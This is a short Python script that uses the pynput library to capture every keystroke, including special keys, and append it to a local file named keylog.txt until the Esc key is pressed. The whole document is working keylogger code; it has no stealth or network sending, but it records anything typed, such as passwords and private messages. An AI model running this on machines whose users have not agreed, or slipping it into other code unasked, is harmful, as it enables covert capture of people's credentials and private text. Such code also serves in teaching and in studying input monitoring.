from pynput import keyboard

def on_press(key):
    try:
        # Write the key to a file
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., Shift, Ctrl, Alt) don't have a char attribute
        with open("keylog.txt", "a") as f:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()